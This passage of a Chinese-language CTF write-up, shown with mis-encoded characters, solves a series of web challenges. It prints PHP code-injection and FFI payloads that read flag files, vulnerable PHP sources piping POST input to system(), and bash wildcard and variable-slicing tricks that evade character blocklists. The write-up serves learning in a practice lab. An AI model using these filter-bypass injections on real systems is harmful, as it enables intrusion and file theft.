</ul>
</li>
</ol>
<h4 id="å¼‚å¸¸å¤„ç†">å¼‚å¸¸å¤„ç†<a hidden class="anchor" aria-hidden="true" href="#å¼‚å¸¸å¤„ç†">#</a></h4>
<ol>
<li>æ•è·å¼‚å¸¸ï¼š
<ul>
<li><code>catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}</code></li>
<li>æ•´ä¸ª <code>try</code> ä»£ç å—è¢«æ”¾ç½®åœ¨ä¸€ä¸ª <code>try-catch</code> è¯­å¥ä¸­ã€‚å¦‚æœåœ¨å°è¯•å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡ŒæŸ¥è¯¢ç­‰æ“ä½œè¿‡ç¨‹ä¸­å‡ºç°ä»»ä½• <code>PDOException</code> å¼‚å¸¸ï¼ˆæ¯”å¦‚æ•°æ®åº“è¿æ¥å¤±è´¥ã€æŸ¥è¯¢è¯­å¥è¯­æ³•é”™è¯¯ç­‰æƒ…å†µï¼‰ï¼Œå¼‚å¸¸å°†ä¼šè¢«è¿™ä¸ª <code>catch</code> å—æ•è·ã€‚</li>
<li>ä¸€æ—¦æ•è·åˆ°å¼‚å¸¸ï¼Œ<code>catch</code> å—ä¸­çš„ä»£ç å°†ä¼šæ‰§è¡Œã€‚è¿™é‡Œé¦–å…ˆé€šè¿‡ <code>$e-&gt;getMessage()</code> è·å–åˆ°å…·ä½“çš„å¼‚å¸¸æ¶ˆæ¯ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œç„¶åä½¿ç”¨ <code>exit(0)</code> ç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œä»¥é˜²æ­¢åç»­å¯èƒ½å‡ºç°çš„é”™è¯¯æˆ–æœªå®šä¹‰è¡Œä¸ºã€‚</li>
</ul>
</li>
</ol></blockquote>
<h4 id="web76">web76<a hidden class="anchor" aria-hidden="true" href="#web76">#</a></h4>
<p><img alt="image-20241130003249705" loading="lazy" src="assets/image-20241130003249705.png"></p>
<p>è¿™é¢˜ä¾æ—§æ˜¯ç”¨globåè®®æŸ¥ç›®å½•ï¼Œå¾—åˆ°æ–‡ä»¶åä¸ºflag36d.txt</p>
<p>ç”¨ä¸Šä¸€é¢˜mysqlçš„æ–¹æ³•ï¼ŒæˆåŠŸæŸ¥åˆ°flag</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$conn = mysqli_connect(&#34;127.0.0.1&#34;, &#34;root&#34;, &#34;root&#34;, &#34;ctftraining&#34;); $sql = &#34;select load_file(&#39;/flag36d.txt&#39;) as a&#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[&#39;a&#39;]; } exit();
</code></pre><h4 id="web77">web77<a hidden class="anchor" aria-hidden="true" href="#web77">#</a></h4>
<p><img alt="image-20241130004911319" loading="lazy" src="assets/image-20241130004911319.png"></p>
<p>ç”¨globåè®®çš„æ–¹æ³•æŸ¥å‡ºflagæ–‡ä»¶ä¸ºflag36x.phpï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶</p>
<p>æ¥ä¸‹æ¥è¦çœ‹çœ‹æ€ä¹ˆæŸ¥æ–‡ä»¶</p>
<p><img alt="image-20241130005425204" loading="lazy" src="assets/image-20241130005425204.png"></p>
<p>ä¸Šä¸¤é¢˜ç”¨åˆ°çš„è¯»flagçš„æ–¹æ³•ï¼ˆmysqlï¼‰è¿™é¢˜ç”¨ä¸äº†ï¼Œéœ€è¦æƒ³ç‚¹å…¶ä»–çš„æ–¹æ³•</p>
<p>å®˜æ–¹çš„wpç”¨ PHP ä¸­çš„ FFIï¼ˆForeign Function Interfaceï¼‰æ–¹æ³•æ¥è°ƒç”¨ C è¯­è¨€çš„ system å‡½æ•°ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ª Shell å‘½ä»¤ã€‚</p>
<blockquote>
<h5 id="ä»€ä¹ˆæ˜¯ffi">ä»€ä¹ˆæ˜¯FFI?<a hidden class="anchor" aria-hidden="true" href="#ä»€ä¹ˆæ˜¯ffi">#</a></h5>
<p>PHP FFIï¼ˆForeign Function Interfaceï¼‰æ˜¯ PHP 7.4 åŠä»¥ä¸Šç‰ˆæœ¬å¼•å…¥çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ã€‚å®ƒå…è®¸ PHP ä»£ç ç›´æ¥è°ƒç”¨ C è¯­è¨€å‡½æ•°ï¼Œä»è€Œå®ç°äº† PHP ä¸ C è¯­è¨€çš„é«˜æ•ˆäº¤äº’ã€‚è¿™ä¸º PHP å¼€å‘è€…æä¾›äº†ä¸€ç§åˆ©ç”¨ C è¯­è¨€çš„é«˜æ€§èƒ½å’Œåº•å±‚æ“ä½œç³»ç»ŸåŠŸèƒ½çš„æ–¹å¼ã€‚</p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>$ffi = FFI::cdef(&#34;int system(const char *command);&#34;);//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡
$a=&#39;/readflag &gt; 1.txt&#39;;//æ²¡æœ‰å›æ˜¾çš„
$ffi-&gt;system($a);//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°
</code></pre><p>é€šè¿‡æ‰§è¡Œç›®å½•ä¸­çš„ /readflag ç¨‹åºå¹¶å°†å…¶è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ 1.txtä¸­ï¼ˆå› ä¸ºåªæ˜¯æ‰§è¡Œçš„è¯æ²¡æœ‰å›æ˜¾ï¼‰</p>
<p>æ‰§è¡Œä¸€ä¸‹</p>
<p><img alt="image-20241130011301444" loading="lazy" src="assets/image-20241130011301444.png"></p>
<p>çœ‹åˆ°æœ‰å›æ˜¾åº”è¯¥æ˜¯æˆåŠŸäº†ï¼Œè®¿é—®ä¸€ä¸‹1.txt</p>
<p><img alt="image-20241130011352138" loading="lazy" src="assets/image-20241130011352138.png"></p>
<p>ç”±äºå½“å‰ç”¨æˆ·æƒé™ä¸è¶³æˆ‘ä»¬æ˜¯ä¸èƒ½ç›´æ¥è¯»flag36x.phpæ–‡ä»¶ä¸­çš„å†…å®¹çš„ï¼Œåªèƒ½é€šè¿‡readflagï¼ˆè„šæœ¬é‡Œé¢ä¼šè¿›è¡Œææƒï¼‰æ¥è¯»</p>
<h4 id="web118">web118<a hidden class="anchor" aria-hidden="true" href="#web118">#</a></h4>
<p>åŸæ–‡åœ°å€ï¼šhttps://blog.csdn.net/Myon5/article/details/140145005</p>
<p>è¾“å…¥æ•°å­—å’Œå°å†™å­—æ¯ï¼Œå›æ˜¾ evil input</p>
<p><img alt="img" loading="lazy" src="./assets/39825df758159aeb1423f84893826541.png"></p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°è¿™é‡Œä¼šå°†æäº¤çš„å‚æ•° code ä¼ ç»™ system å‡½æ•°</p>
<p><img alt="img" loading="lazy" src="./assets/ef28276a3cf0375675a6bde71506fcec.png"></p>
<p>ä½¿ç”¨ burpsuite æŠ“åŒ…è¿›è¡Œå•ä¸ªå­—ç¬¦çš„æ¨¡ç³Šæµ‹è¯• fuzzï¼š</p>
<p><img alt="img" loading="lazy" src="./assets/584e4b78646d635bd58f6507fe24c725.png"></p>
<p>å‘ç°è¿‡æ»¤æ‰äº†æ•°å­—å’Œå°å†™å­—æ¯ä»¥åŠä¸€äº›ç¬¦å·ï¼Œä¸‹é¢æ¡†èµ·æ¥çš„éƒ¨åˆ†æ˜¯å¯ç”¨çš„</p>
<p><img alt="img" loading="lazy" src="./assets/cce43cb38968e67bc8db9d0b7dec6750.png"></p>
<p>ç»“åˆé¢˜ç›®æç¤ºï¼šflag åœ¨ flag.php</p>
<p><img alt="img" loading="lazy" src="./assets/8eb2710f201069ae75d2229e71d76be1.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ„é€ å‡ºå‘½ä»¤å»è¯»å– flag.php</p>
<blockquote>
<p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ Linux çš„å†…ç½®å˜é‡
åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæœ‰è®¸å¤šå†…ç½®å˜é‡ï¼ˆç¯å¢ƒå˜é‡ï¼‰ç”¨äºé…ç½®ç³»ç»Ÿè¡Œä¸ºå’Œå­˜å‚¨ç³»ç»Ÿä¿¡æ¯ã€‚</p>
<p>ï¼ˆ1ï¼‰$BASH</p>
<p>æè¿°ï¼šæŒ‡å‘å½“å‰ä½¿ç”¨çš„Bashè§£é‡Šå™¨çš„è·¯å¾„ã€‚
ç¤ºä¾‹ï¼š/bin/bash
ç”¨é€”ï¼šç”¨äºç¡®å®šæ­£åœ¨ä½¿ç”¨çš„Bashç‰ˆæœ¬å’Œè·¯å¾„ã€‚</p>
<p>ï¼ˆ2ï¼‰ $PATH</p>
<p>æè¿°ï¼šå­˜å‚¨ä¸€ç³»åˆ—è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ç”¨äºæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå½“ä½ åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨è¿™äº›è·¯å¾„ä¸­æŸ¥æ‰¾å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚
ç¤ºä¾‹ï¼š/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ç”¨é€”ï¼šå½±å“å‘½ä»¤çš„æŸ¥æ‰¾å’Œæ‰§è¡Œï¼Œå¯ä»¥æ·»åŠ è‡ªå®šä¹‰è„šæœ¬æˆ–ç¨‹åºçš„è·¯å¾„ã€‚</p>
<p>ï¼ˆ3ï¼‰$HOME</p>
<p>æè¿°ï¼šå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•è·¯å¾„ã€‚
ç¤ºä¾‹ï¼š/home/username
ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨ç”¨æˆ·é…ç½®æ–‡ä»¶å’Œä¸ªäººæ•°æ®ã€‚</p>
<p>ï¼ˆ4ï¼‰$PWD</p>
<p>æè¿°ï¼šå½“å‰å·¥ä½œç›®å½•ï¼ˆPresent Working Directoryï¼‰ã€‚
ç¤ºä¾‹ï¼š/home/username/projects
ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰çš„å·¥ä½œç›®å½•è·¯å¾„ï¼Œå¸¸ç”¨äºè„šæœ¬å’Œå‘½ä»¤ä¸­è·å–æˆ–æ˜¾ç¤ºå½“å‰ç›®å½•ã€‚</p>
<p>ï¼ˆ5ï¼‰$USER</p>
<p>æè¿°ï¼šå½“å‰ç™»å½•çš„ç”¨æˆ·åã€‚
ç¤ºä¾‹ï¼šusername
ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„åç§°ï¼Œå¸¸ç”¨äºæ˜¾ç¤ºæˆ–æ£€æŸ¥ç”¨æˆ·ä¿¡æ¯ã€‚</p>
<p>ï¼ˆ6ï¼‰$SHELL</p>
<p>æè¿°ï¼šå½“å‰ç”¨æˆ·çš„é»˜è®¤shellã€‚
ç¤ºä¾‹ï¼š/bin/bash
ç”¨é€”ï¼šè¡¨ç¤ºç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨çš„é»˜è®¤shellè·¯å¾„ã€‚</p>
<p>ï¼ˆ7ï¼‰$UID</p>
<p>æè¿°ï¼šå½“å‰ç”¨æˆ·çš„ç”¨æˆ·IDã€‚
ç¤ºä¾‹ï¼š1000ï¼ˆæ™®é€šç”¨æˆ·ï¼‰ï¼Œ0ï¼ˆrootç”¨æˆ·ï¼‰
ç”¨é€”ï¼šæ ‡è¯†å½“å‰ç”¨æˆ·çš„å”¯ä¸€IDã€‚</p>
<p>ï¼ˆ8ï¼‰$IFS</p>
<p>æè¿°ï¼šå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼ˆInternal Field Separatorï¼‰ï¼Œç”¨äºåˆ†å‰²è¾“å…¥çš„å­—æ®µï¼Œé»˜è®¤ä¸ºç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ã€‚
ç¤ºä¾‹ï¼šé»˜è®¤å€¼ä¸º<space><tab><newline>
ç”¨é€”ï¼šå½±å“è„šæœ¬ä¸­çš„å­—æ®µåˆ†å‰²ï¼Œå¸¸ç”¨äºå¤„ç†è¾“å…¥å’Œè§£ææ–‡æœ¬ã€‚</p></blockquote>
<p>æ­¤å¤–è¿˜æœ‰å¾ˆå¤šçš„å†…ç½®å˜é‡ï¼š</p>
<p><img alt="img" loading="lazy" src="./assets/3b6a3d156d5f7a2118ef1e73708dc47f.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çŸ¥é“ Bash å˜é‡çš„åˆ‡ç‰‡ï¼Œä¸ python çš„åˆ‡ç‰‡ç±»ä¼¼ï¼Œç›®çš„è¿˜æ˜¯ä»æŒ‡å®šä½ç½®å¼€å§‹æå–å­å­—ç¬¦ä¸²ï¼Œç”¨æ³•ï¼š${VAR:offset:length}ï¼Œçœ‹ä¾‹å­ï¼š</p>
<pre tabindex="0"><code>${PWD:1:2}
</code></pre><p>æå–ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹çš„ä¸¤ä¸ªå­—ç¬¦ï¼Œå³ roï¼Œåœ¨ Bash ä¸­ï¼Œå­—ç¬¦ä¸²åˆ‡ç‰‡çš„ç´¢å¼•ä¹Ÿæ˜¯ä» 0 å¼€å§‹çš„ã€‚</p>
<p><img alt="img" loading="lazy" src="./assets/9a68ddaee573e2a4c8f029c1b1439303.png"></p>
<p>å¦‚æœåªå¡«ä¸€ä¸ªå‚æ•°ï¼Œä¼šé»˜è®¤ä»æŒ‡å®šçš„ä½ç½®å¼€å§‹æå–åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾ï¼š</p>
<pre tabindex="0"><code>${PWD:3}
</code></pre><p><img alt="img" loading="lazy" src="./assets/05801ab65baf0c3f8ef755d2440035d3.png"></p>
<p>ç®€å•æµ‹ä¸€ä¸‹æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ³¢æµªå·çš„æ•ˆæœï¼šä»ç»“å°¾å¼€å§‹å–</p>
<p><img alt="img" loading="lazy" src="./assets/05801ab65baf0c3f8ef755d2440035d3-20250107141042427.png"></p>
<p>ä½†æ˜¯è¿™é‡Œæ•°å­—è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨å¤§å†™å­—æ¯ç»•è¿‡ï¼š</p>
<p>å¯ä»¥å‘ç°ä»»æ„çš„å¤§å°å†™å­—æ¯ä¸æ•°å­— 0 ç­‰æ•ˆ</p>
<p><img alt="img" loading="lazy" src="./assets/20028ec8b263329b22bf7127236e5cb9.png"></p>
<p>ä¸éš¾æƒ³åˆ°è¿™é‡Œçš„ $PWD åº”è¯¥æ˜¯ /var/www/htmlï¼ˆç½‘é¡µæœåŠ¡æ‰€åœ¨çš„å¸¸è§è·¯å¾„ï¼‰ï¼›</p>
<p>è€Œ $PATH çš„ç»“å°¾åº”è¯¥ä¹Ÿæ˜¯ /binï¼ˆè¿™ä¸ªåœ¨å‰é¢æˆ‘ä»¬å·²ç»æµ‹è¯•è¿‡äº†ï¼‰ã€‚</p>
<p><img alt="img" loading="lazy" src="./assets/1f28e989351c75dc265bdf60244d9bad.png"></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å‡º nl å‘½ä»¤æ¥è¯»å– flag.phpï¼Œç”±äº ? å¯ç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œé€šé…ï¼Œç»•è¿‡å­—æ¯çš„è¿‡æ»¤ï¼Œæ„é€  payloadï¼š</p>
<pre tabindex="0"><code>${PATH:~Q}${PWD:~Q} ????.???
</code></pre><p><img alt="img" loading="lazy" src="./assets/22118ba0371383bb7b3ff39f6dd322be.png"></p>
<p>å½“ç„¶é¢˜ç›®è¿˜ç»™äº†å…¶ä»– payloadï¼š</p>
<pre tabindex="0"><code>${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
</code></pre><p>åœ¨Bashä¸­ï¼Œ${#var} çš„è¯­æ³•ç”¨äºè·å–å˜é‡ var çš„é•¿åº¦ï¼ˆå³å­—ç¬¦æ•°ï¼‰ã€‚</p>
<p>è¿™ç§å½¢å¼å¯ä»¥åº”ç”¨äºä»»ä½•å˜é‡ï¼Œæ— è®ºæ˜¯å­—ç¬¦ä¸²å˜é‡è¿˜æ˜¯ç¯å¢ƒå˜é‡ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ ${HOME} æ˜¯ /rootï¼Œå› æ­¤ ${#HOME} å°±æ˜¯ 5ã€‚</p>
<p><img alt="img" loading="lazy" src="./assets/699d0549b84964404cd7c602c5a687d5.png"></p>
<p>ä»¥æ­¤ç±»æ¨ï¼Œæœ€ç»ˆå°†è¿™äº›æ•°å­—åº”ç”¨åˆ°åˆ‡ç‰‡ä¸­å»ï¼Œç»•è¿‡å¯¹æ•°å­—çš„è¿‡æ»¤ï¼Œæ„é€ å‡ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<h4 id="web119">Web119<a hidden class="anchor" aria-hidden="true" href="#web119">#</a></h4>
<p>å…ˆç”¨ä¸Šä¸€é¢˜çš„payloadæ‰“äº†ä¸€ä¸‹ï¼Œæ˜¾ç¤ºevil input</p>
<p>æµ‹äº†ä¸€ä¸‹ä¸Šé¢˜ç”¨çš„PATHè¢«banäº†</p>
<p>æ¢ä¸ªæ–¹æ³•</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
ç›¸å½“äº/???/??t ????.???
åŒ¹é…/bin/cat ????.???
</code></pre><p>${#SHLVL}}=1</p>
<p>${PWD::${#SHLVL}} = /</p>
<p>${#HOSTNAME}=4    //ç”¨æˆ·åçš„ä½æ•°ï¼Œè¿™é‡Œç”¨æˆ·åæ˜¯rootï¼Œæ•…ä¸º4</p>
<p>å¦ä¸€ç§æ–¹æ³•</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
ç›¸å½“äº/???/?????4 ????.??? æˆ–è€… /???/?????5 ????.???
æƒ³è¦åŒ¹é…/bin/base64 ????.???
</code></pre><p>{#RANDOM} = 4æˆ–5</p>
<p>ç”±äºå¯èƒ½æ˜¯5ï¼Œæ‰€ä»¥è¦å¤šè¯•å‡ æ¬¡ï¼Œè¿˜è¦è¿›è¡Œbase64è§£ç </p>
<h4 id="web120">web120<a hidden class="anchor" aria-hidden="true" href="#web120">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜æŠŠä¸Šé¢˜çš„HOMEä¹Ÿbanäº†ï¼Œä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•è¿˜èƒ½å‡ºï¼Œè€Œä¸”é•¿åº¦ä¹Ÿç¬¦åˆ</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
</code></pre><p><img alt="image-20250118212249002" loading="lazy" src="assets/image-20250118212249002.png"></p>
<p>æˆ–</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
</code></pre><h4 id="web121">web121<a hidden class="anchor" aria-hidden="true" href="#web121">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜SHLVLè¢«banäº†ï¼Œå¯ä»¥ç”¨?ä»£æ›¿</p>
<p>${#?}=1</p>
<p>payload</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
</code></pre><p>æˆ–</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???
/bin/rev
</code></pre><p>revæ˜¯å€’å™è¾“å‡ºçš„</p>
<h4 id="web122">web122<a hidden class="anchor" aria-hidden="true" href="#web122">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
